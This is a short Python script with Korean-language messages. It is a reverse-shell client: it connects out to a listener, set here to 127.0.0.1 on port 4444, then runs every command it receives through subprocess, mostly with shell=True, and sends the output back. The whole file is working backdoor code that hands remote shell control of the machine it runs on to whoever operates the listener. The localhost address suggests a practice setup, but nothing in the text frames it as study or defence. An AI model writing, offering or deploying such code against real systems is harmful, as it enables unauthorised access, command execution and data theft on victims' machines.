import socket, subprocess, threading, os

def connect(h, p):
    cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cSocket.connect((h, p))

    msg = cSocket.getsockname()[0] + '과의 연결이 되었습니다.'
    data = msg.encode()
    cSocket.send(data)
    try:
        while True:
            data = cSocket.recv(4096)
            msg = data.decode()

            print('Received : ', msg)
            if msg == 'exit':
                break
            elif msg.find('python3') == 0 : 
                print(msg, " 파일을 실행합니다")
                data = '파일 실행중...'
                cSocket.send(data.encode())
                data = subprocess.run(msg.split(' '))
            elif msg.find('cd') == 0:
                cd = msg.split(' ')
                os.chdir(cd[1])
                data = subprocess.run('pwd',shell=True, stdout=subprocess.PIPE, encoding='utf-8')
                msg = data.stdout
                cSocket.send(msg.encode())
            else : # 파일 실행이 아닐 때는 그냥 전송
                data = subprocess.run(msg.split(' '),shell=True, stdout=subprocess.PIPE, encoding='utf-8')
                print(data)
                msg = data.stdout
                # print(msg)
                cSocket.send(msg.encode())

    except socket.error as erm: 
        print('클라이언트가 종료되었습니다.', erm)
    finally:
        cSocket.close()

if __name__ == '__main__':
    h = '127.0.0.1'
    p = 4444
    try:
        th = threading.Thread(target=connect, args=(h, p))
        th.start()
    except threading.ThreadError as ter:
        print('스레드가 종료되었습니다. ', ter)    
    
